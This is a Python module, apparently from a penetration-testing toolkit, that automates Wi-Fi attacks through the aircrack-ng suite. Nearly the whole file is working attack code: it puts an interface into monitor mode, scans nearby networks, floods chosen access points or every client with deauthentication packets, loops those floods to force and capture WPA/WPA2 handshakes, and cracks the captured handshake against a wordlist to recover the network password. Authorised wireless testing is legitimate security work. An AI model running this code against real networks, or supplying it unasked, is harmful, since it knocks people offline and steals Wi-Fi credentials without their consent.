"""
Wi-Fi Attack Module

This module provides Wi-Fi penetration testing capabilities including:
- Monitor mode management
- Network scanning with real-time data processing
- Deauthentication attacks
- Handshake capture
- Password cracking
"""

import subprocess
import re
import time
from typing import List, Dict, Optional
from utils.console import print_info, print_success, print_error, print_warning, console
from utils.checker import check_tool
from utils.installer import install_package

# Required tools for Wi-Fi operations
REQUIRED_TOOLS = ["airmon-ng", "airodump-ng", "aireplay-ng", "aircrack-ng"]


def check_wifi_tools() -> bool:
    """
    Check if all required Wi-Fi tools are installed.
    
    Returns:
        bool: True if all tools are available, False otherwise
    """
    print_info("Checking Wi-Fi attack tools...")
    all_available = True
    
    for tool in REQUIRED_TOOLS:
        if not check_tool(tool):
            all_available = False
            if not install_package("aircrack-ng"):
                return False
            break
    
    return all_available


def get_wireless_interfaces() -> List[str]:
    """
    Get a list of available wireless network interfaces.
    
    Returns:
        List[str]: List of wireless interface names
    """
    try:
        result = subprocess.run(
            ["iwconfig"],
            capture_output=True,
            text=True,
            timeout=10
        )
        
        interfaces = []
        for line in result.stdout.split('\n'):
            if line and not line.startswith(' '):
                interface = line.split()[0]
                if interface != 'lo':
                    interfaces.append(interface)
        
        return interfaces
        
    except Exception as e:
        print_error(f"Failed to get wireless interfaces: {str(e)}")
        return []


def enable_monitor_mode(interface: str) -> Optional[str]:
    """
    Enable monitor mode on a wireless interface.
    
    Args:
        interface: Name of the wireless interface
        
    Returns:
        str: Name of the monitor interface, or None if failed
    """
    try:
        print_info(f"Enabling monitor mode on {interface}...")
        
        # Kill interfering processes
        subprocess.run(
            ["airmon-ng", "check", "kill"],
            capture_output=True,
            timeout=30
        )
        
        # Start monitor mode
        result = subprocess.run(
            ["airmon-ng", "start", interface],
            capture_output=True,
            text=True,
            timeout=30
        )
        
        # Extract monitor interface name from output
        monitor_interface = None
        for line in result.stdout.split('\n'):
            if "monitor mode" in line.lower() and "enabled" in line.lower():
                # Try to extract interface name
                match = re.search(r'\b(\w+mon)\b', line)
                if match:
                    monitor_interface = match.group(1)
                    break
        
        # Fallback: common naming patterns
        if not monitor_interface:
            monitor_interface = f"{interface}mon"
        
        # Verify the interface exists
        verify_result = subprocess.run(
            ["iwconfig", monitor_interface],
            capture_output=True,
            text=True,
            timeout=10
        )
        
        if "Mode:Monitor" in verify_result.stdout:
            print_success(f"Monitor mode enabled: {monitor_interface}")
            return monitor_interface
        else:
            print_error(f"Failed to enable monitor mode on {interface}")
            return None
            
    except subprocess.TimeoutExpired:
        print_error("Monitor mode operation timed out")
        return None
    except Exception as e:
        print_error(f"Error enabling monitor mode: {str(e)}")
        return None


def disable_monitor_mode(monitor_interface: str) -> bool:
    """
    Disable monitor mode on a wireless interface.
    
    Args:
        monitor_interface: Name of the monitor interface
        
    Returns:
        bool: True if successful, False otherwise
    """
    try:
        print_info(f"Disabling monitor mode on {monitor_interface}...")
        
        result = subprocess.run(
            ["airmon-ng", "stop", monitor_interface],
            capture_output=True,
            text=True,
            timeout=30
        )
        
        if result.returncode == 0:
            print_success(f"Monitor mode disabled on {monitor_interface}")
            
            # Restart NetworkManager
            subprocess.run(
                ["systemctl", "restart", "NetworkManager"],
                capture_output=True,
                timeout=30
            )
            return True
        else:
            print_error(f"Failed to disable monitor mode: {result.stderr}")
            return False
            
    except subprocess.TimeoutExpired:
        print_error("Disable monitor mode operation timed out")
        return False
    except Exception as e:
        print_error(f"Error disabling monitor mode: {str(e)}")
        return False


def scan_wifi_networks(monitor_interface: str, duration: int = 10) -> List[Dict[str, str]]:
    """
    Scan for Wi-Fi networks using real-time data processing.
    No temporary files are created - all data is parsed from stdout.
    
    Args:
        monitor_interface: Name of the monitor mode interface
        duration: Scan duration in seconds
        
    Returns:
        List[Dict]: List of discovered networks with their details
    """
    networks = []
    seen_bssids = set()
    
    try:
        print_info(f"Scanning Wi-Fi networks on {monitor_interface} for {duration} seconds...")
        print_info("Press Ctrl+C to stop scanning early")
        
        # Start airodump-ng with stdout output (no file output)
        process = subprocess.Popen(
            ["airodump-ng", monitor_interface],
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True,
            bufsize=1
        )
        
        start_time = time.time()
        parsing_networks = False
        
        # Real-time parsing loop
        while time.time() - start_time < duration:
            try:
                # Read line from stdout with timeout
                line = process.stdout.readline()
                
                if not line:
                    if process.poll() is not None:
                        break
                    continue
                
                line = line.strip()
                
                # Detect network section in output
                if "BSSID" in line and "PWR" in line:
                    parsing_networks = True
                    continue
                
                # Stop parsing at client section
                if "STATION" in line and parsing_networks:
                    parsing_networks = False
                    continue
                
                # Parse network data
                if parsing_networks and line:
                    # airodump-ng output format (approximate):
                    # BSSID              PWR  Beacons  #Data  #/s  CH  MB  ENC  CIPHER AUTH ESSID
                    parts = re.split(r'\s{2,}', line)
                    
                    if len(parts) >= 10:
                        bssid = parts[0].strip()
                        
                        # Validate BSSID format (MAC address)
                        if re.match(r'^([0-9A-Fa-f]{2}[:-]){5}([0-9A-Fa-f]{2})$', bssid):
                            if bssid not in seen_bssids:
                                seen_bssids.add(bssid)
                                
                                # Extract network information
                                network = {
                                    'bssid': bssid,
                                    'power': parts[1].strip() if len(parts) > 1 else 'N/A',
                                    'beacons': parts[2].strip() if len(parts) > 2 else '0',
                                    'data': parts[3].strip() if len(parts) > 3 else '0',
                                    'channel': parts[5].strip() if len(parts) > 5 else 'N/A',
                                    'speed': parts[6].strip() if len(parts) > 6 else 'N/A',
                                    'encryption': parts[7].strip() if len(parts) > 7 else 'OPN',
                                    'cipher': parts[8].strip() if len(parts) > 8 else 'N/A',
                                    'auth': parts[9].strip() if len(parts) > 9 else 'N/A',
                                    'essid': parts[10].strip() if len(parts) > 10 else '<Hidden>'
                                }
                                
                                networks.append(network)
                                print_success(f"Found: {network['essid']} ({bssid}) - CH:{network['channel']} - ENC:{network['encryption']}")
                
            except KeyboardInterrupt:
                print_warning("\nScan interrupted by user")
                break
            except Exception as line_error:
                # Skip problematic lines silently
                continue
        
        # Terminate the process
        process.terminate()
        try:
            process.wait(timeout=5)
        except subprocess.TimeoutExpired:
            process.kill()
            process.wait()
        
        print_success(f"Scan complete! Found {len(networks)} unique networks")
        return networks
        
    except FileNotFoundError:
        print_error("airodump-ng not found. Please install aircrack-ng suite.")
        return []
    except Exception as e:
        print_error(f"Error during network scan: {str(e)}")
        return []


def perform_deauth_attack(monitor_interface: str, bssid: str, client_mac: Optional[str] = None, count: int = 0) -> bool:
    """
    Perform a deauthentication attack on a target network.
    
    Args:
        monitor_interface: Name of the monitor mode interface
        bssid: Target access point BSSID
        client_mac: Specific client MAC to deauth (None for broadcast)
        count: Number of deauth packets to send (0 for continuous)
        
    Returns:
        bool: True if attack was initiated successfully, False otherwise
    """
    try:
        target = client_mac if client_mac else "FF:FF:FF:FF:FF:FF"
        
        if count > 0:
            print_info(f"Sending {count} deauth packets to {bssid}")
        else:
            print_info(f"Performing continuous deauth attack on {bssid}")
            print_warning("Press Ctrl+C to stop")
        
        cmd = ["aireplay-ng", "--deauth", str(count), "-a", bssid]
        
        if client_mac:
            cmd.extend(["-c", client_mac])
        
        cmd.append(monitor_interface)
        
        process = subprocess.Popen(
            cmd,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True
        )
        
        try:
            if count > 0:
                # Wait for completion
                process.wait(timeout=30)
                print_success("Deauth attack completed")
            else:
                # Continuous mode - wait for Ctrl+C
                process.wait()
        except KeyboardInterrupt:
            print_warning("\nDeauth attack stopped by user")
            process.terminate()
            process.wait(timeout=5)
        
        return True
        
    except FileNotFoundError:
        print_error("aireplay-ng not found. Please install aircrack-ng suite.")
        return False
    except Exception as e:
        print_error(f"Error during deauth attack: {str(e)}")
        return False


def capture_handshake_with_deauth(monitor_interface: str, bssid: str, channel: str, 
                                   client_mac: Optional[str] = None, output_prefix: str = "handshake",
                                   max_duration: int = 60) -> Optional[str]:
    """
    Capture WPA/WPA2 handshake from a target network with automatic deauthentication.
    Manages two concurrent subprocesses: airodump-ng for listening and aireplay-ng for deauth.
    
    Args:
        monitor_interface: Name of the monitor mode interface
        bssid: Target access point BSSID
        channel: Target channel
        client_mac: Specific client MAC to deauth (None for broadcast)
        output_prefix: Output file prefix for capture
        max_duration: Maximum capture duration in seconds
        
    Returns:
        str: Path to capture file if handshake was captured, None otherwise
    """
    import threading
    import os
    from utils.config import get_setting
    
    try:
        print_info(f"🎯 Target: {bssid} on channel {channel}")
        print_info(f"Starting automated WPA/WPA2 handshake capture...")
        print_warning(f"Maximum capture time: {max_duration} seconds")
        
        # Set interface to specific channel
        subprocess.run(
            ["iwconfig", monitor_interface, "channel", channel],
            capture_output=True,
            timeout=10
        )
        
        # Prepare output file path
        timestamp = time.strftime("%Y%m%d_%H%M%S")
        output_file = f"{output_prefix}_{timestamp}"
        
        # Start airodump-ng capture process
        print_info("📡 Starting packet capture with airodump-ng...")
        airodump_cmd = [
            "airodump-ng",
            "--bssid", bssid,
            "-c", channel,
            "-w", output_file,
            monitor_interface
        ]
        
        airodump_process = subprocess.Popen(
            airodump_cmd,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True,
            bufsize=1
        )
        
        # Give airodump-ng time to start
        time.sleep(3)
        
        # Start deauth attack in a separate thread
        deauth_count = get_setting('wifi_settings.deauth_count', 5)
        deauth_active = threading.Event()
        deauth_active.set()
        
        def deauth_worker():
            """Worker thread for sending deauth packets"""
            try:
                time.sleep(2)  # Wait for airodump to stabilize
                
                while deauth_active.is_set():
                    target_client = client_mac if client_mac else "FF:FF:FF:FF:FF:FF"
                    
                    print_info(f"💥 Sending {deauth_count} deauth packets to {bssid}" + 
                              (f" (client: {client_mac})" if client_mac else " (broadcast)"))
                    
                    aireplay_cmd = [
                        "aireplay-ng",
                        "--deauth", str(deauth_count),
                        "-a", bssid
                    ]
                    
                    if client_mac:
                        aireplay_cmd.extend(["-c", client_mac])
                    
                    aireplay_cmd.append(monitor_interface)
                    
                    deauth_process = subprocess.Popen(
                        aireplay_cmd,
                        stdout=subprocess.PIPE,
                        stderr=subprocess.PIPE,
                        text=True
                    )
                    
                    deauth_process.wait(timeout=10)
                    
                    # Wait before next deauth cycle
                    if deauth_active.is_set():
                        time.sleep(5)
                        
            except Exception as e:
                print_error(f"Deauth worker error: {str(e)}")
        
        # Start deauth thread
        deauth_thread = threading.Thread(target=deauth_worker, daemon=True)
        deauth_thread.start()
        
        # Monitor airodump-ng output for handshake
        print_info("👂 Monitoring for WPA handshake...")
        start_time = time.time()
        handshake_captured = False
        capture_file = None
        
        try:
            while time.time() - start_time < max_duration:
                # Check if process is still running
                if airodump_process.poll() is not None:
                    break
                
                # Read output line
                line = airodump_process.stdout.readline()
                
                if not line:
                    time.sleep(0.1)
                    continue
                
                # Detect handshake capture
                if "WPA handshake" in line or "handshake" in line.lower():
                    # Extract BSSID from handshake message if present
                    if bssid.replace(":", "").upper() in line.replace(":", "").upper():
                        handshake_captured = True
                        print_success(f"✅ WPA handshake captured from {bssid}!")
                        break
                
                # Also check for handshake in top-right corner format
                # Some versions show: [ WPA handshake: XX:XX:XX:XX:XX:XX ]
                handshake_match = re.search(r'WPA handshake:\s*([0-9A-Fa-f:]{17})', line)
                if handshake_match:
                    captured_bssid = handshake_match.group(1)
                    if captured_bssid.upper() == bssid.upper():
                        handshake_captured = True
                        print_success(f"✅ WPA handshake captured from {bssid}!")
                        break
        
        except KeyboardInterrupt:
            print_warning("\n⚠️  Capture interrupted by user")
        
        # Stop deauth thread
        deauth_active.clear()
        
        # Terminate airodump-ng
        airodump_process.terminate()
        try:
            airodump_process.wait(timeout=5)
        except subprocess.TimeoutExpired:
            airodump_process.kill()
            airodump_process.wait()
        
        # Wait for deauth thread to finish
        deauth_thread.join(timeout=2)
        
        # Determine capture file path
        # airodump-ng creates files with -01 suffix
        capture_file = f"{output_file}-01.cap"
        
        if handshake_captured:
            if os.path.exists(capture_file):
                print_success(f"🎉 Handshake successfully captured!")
                print_success(f"📁 File saved to: {capture_file}")
                print_info(f"📝 Next step: Crack with: aircrack-ng -w <wordlist> {capture_file}")
                return capture_file
            else:
                print_error("Handshake detected but capture file not found")
                return None
        else:
            if os.path.exists(capture_file):
                print_warning(f"⚠️  Handshake not detected in output")
                print_info(f"📁 Capture saved to: {capture_file}")
                print_info(f"💡 Check manually with: aircrack-ng {capture_file}")
                return capture_file
            else:
                print_error("❌ Handshake not captured. Possible reasons:")
                print_info("   • No clients connected to the AP")
                print_info("   • Clients didn't reconnect during deauth")
                print_info("   • Channel interference")
                print_info("   • Try again with a specific client MAC")
                return None
            
    except Exception as e:
        print_error(f"Error during handshake capture: {str(e)}")
        return None


def capture_handshake(monitor_interface: str, bssid: str, channel: str, output_prefix: str = "handshake", 
                     duration: int = 60, auto_deauth: bool = True, client_mac: Optional[str] = None) -> Optional[str]:
    """
    Capture WPA/WPA2 handshake from a target network.
    
    Args:
        monitor_interface: Name of the monitor mode interface
        bssid: Target access point BSSID
        channel: Target channel
        output_prefix: Output file prefix for capture
        duration: Capture duration in seconds
        auto_deauth: Automatically send deauth packets (recommended)
        client_mac: Specific client MAC to deauth (optional)
        
    Returns:
        str: Path to capture file if handshake was captured, None otherwise
    """
    if auto_deauth:
        # Use the enhanced version with automatic deauth
        return capture_handshake_with_deauth(
            monitor_interface, bssid, channel, client_mac, output_prefix, duration
        )
    else:
        # Use manual capture (legacy mode)
        try:
            print_info(f"Capturing handshake from {bssid} on channel {channel}")
            print_info(f"Capture will run for {duration} seconds")
            print_warning("Tip: Perform a deauth attack in another terminal to force handshake")
            
            # Set interface to specific channel
            subprocess.run(
                ["iwconfig", monitor_interface, "channel", channel],
                capture_output=True,
                timeout=10
            )
            
            # Start capture
            process = subprocess.Popen(
                ["airodump-ng", "--bssid", bssid, "-c", channel, "-w", output_prefix, monitor_interface],
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True
            )
            
            start_time = time.time()
            handshake_captured = False
            
            # Monitor output for handshake
            while time.time() - start_time < duration:
                try:
                    line = process.stdout.readline()
                    if "WPA handshake" in line:
                        handshake_captured = True
                        print_success("WPA handshake captured!")
                        break
                except KeyboardInterrupt:
                    print_warning("\nCapture interrupted by user")
                    break
            
            # Stop capture
            process.terminate()
            try:
                process.wait(timeout=5)
            except subprocess.TimeoutExpired:
                process.kill()
                process.wait()
            
            if handshake_captured:
                print_success(f"Handshake saved to {output_prefix}-01.cap")
                return f"{output_prefix}-01.cap"
            else:
                print_warning("Handshake not captured. Try running a deauth attack.")
                return None
                
        except Exception as e:
            print_error(f"Error during handshake capture: {str(e)}")
            return None


def crack_handshake(capture_file: str, wordlist: str) -> Optional[str]:
    """
    Crack WPA/WPA2 handshake using a wordlist.
    
    Args:
        capture_file: Path to capture file containing handshake
        wordlist: Path to wordlist file
        
    Returns:
        str: Cracked password if successful, None otherwise
    """
    try:
        print_info(f"Cracking handshake from {capture_file}")
        print_info(f"Using wordlist: {wordlist}")
        print_warning("This may take a while depending on wordlist size...")
        
        process = subprocess.Popen(
            ["aircrack-ng", "-w", wordlist, capture_file],
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True
        )
        
        password = None
        
        # Monitor output for cracked password
        for line in process.stdout:
            console.print(line.strip())
            
            # Look for KEY FOUND pattern
            if "KEY FOUND" in line:
                # Extract password from output
                match = re.search(r'KEY FOUND.*\[\s*(.+?)\s*\]', line)
                if match:
                    password = match.group(1)
                    print_success(f"Password cracked: {password}")
                    break
        
        process.wait()
        
        if password:
            return password
        else:
            print_warning("Password not found in wordlist")
            return None
            
    except FileNotFoundError:
        print_error("aircrack-ng not found. Please install aircrack-ng suite.")
        return None
    except Exception as e:
        print_error(f"Error during password cracking: {str(e)}")
        return None


# Interactive Mode Handler
from rich.prompt import Prompt
from utils.ui import print_wifi_menu, clear_screen
from utils.config import get_wordlist

def run_wifi_module():
    """
    Main function for the Wi-Fi module in interactive mode.
    """
    # Global dependency check runs at startup; local checks removed

    interfaces = get_wireless_interfaces()
    if not interfaces:
        print_error("No wireless interfaces found. Aborting Wi-Fi module.")
        return
    
    print_info(f"Available interfaces: {', '.join(interfaces)}")
    interface = Prompt.ask("\n[cyan]Select an interface to use[/cyan]", choices=interfaces, default=interfaces[0])

    monitor_interface = None

    while True:
        clear_screen()
        print_wifi_menu()
        choice = Prompt.ask("\n[cyan]Select option[/cyan]", choices=["0", "1", "2", "3", "4", "5"], default="0")

        if choice == "0": 
            if monitor_interface: disable_monitor_mode(monitor_interface)
            break

        if choice == "1": # Monitor Mode
            if monitor_interface:
                if Prompt.ask(f"[yellow]Monitor mode is active on {monitor_interface}. Disable it?[/yellow]", default=True):
                    disable_monitor_mode(monitor_interface)
                    monitor_interface = None
            else:
                if Prompt.ask(f"[cyan]Enable monitor mode on {interface}?[/cyan]", default=True):
                    monitor_interface = enable_monitor_mode(interface)

        elif choice == "2": # Network Scan
            if not monitor_interface: monitor_interface = enable_monitor_mode(interface)
            if monitor_interface: 
                duration = int(Prompt.ask("Enter scan duration (seconds)", default="30"))
                scan_wifi_networks(monitor_interface, duration)

        elif choice == "3": # Deauth Attack
            if not monitor_interface: monitor_interface = enable_monitor_mode(interface)
            if monitor_interface:
                bssid = Prompt.ask("Enter target BSSID (MAC Address)")
                client = Prompt.ask("Enter client MAC (optional, press Enter for broadcast)", default="FF:FF:FF:FF:FF:FF")
                count = int(Prompt.ask("Number of packets (0 for continuous)", default="10"))
                perform_deauth_attack(monitor_interface, bssid, client, count)

        elif choice == "4": # Handshake Capture
            if not monitor_interface: monitor_interface = enable_monitor_mode(interface)
            if monitor_interface:
                bssid = Prompt.ask("Enter target BSSID")
                channel = Prompt.ask("Enter target channel")
                duration = int(Prompt.ask("Enter capture duration (seconds)", default="60"))
                capture_handshake_with_deauth(monitor_interface, bssid, channel, max_duration=duration)

        elif choice == "5": # Password Cracking
            cap_file = Prompt.ask("Enter path to .cap file")
            wordlist = Prompt.ask("Enter path to wordlist", default=get_wordlist('passwords'))
            crack_handshake(cap_file, wordlist)

        input("\nPress Enter to continue...")

